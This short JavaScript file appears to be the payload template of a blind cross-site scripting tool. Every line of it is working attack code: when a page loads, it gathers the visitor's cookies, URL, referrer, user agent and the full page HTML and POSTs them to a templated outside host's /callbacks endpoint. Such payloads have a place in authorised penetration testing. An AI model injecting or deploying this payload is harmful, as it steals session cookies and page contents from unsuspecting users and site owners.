//Invocation


function capture(){
          var user_agent = navigator.userAgent;
          var uri = document.URL;
          var referrer = document.referrer;
          var cookies = document.cookie;
          var dom = document.documentElement.outerHTML;
          var xss_uid = {{xss_uid}};
        $.ajax({
                type: "POST",
                async: false,
                url: "{{callback_protocol}}://{{hostname}}/callbacks",
                data: {
                  uri: uri,
                  xss_uid: xss_uid,
                  referrer: referrer,
                  cookies: cookies,
                  user_agent: user_agent,
                  dom: dom
                  }
          }).done(function (respond) {
            console.log(respond);
        });
}
$(document).ready(capture());
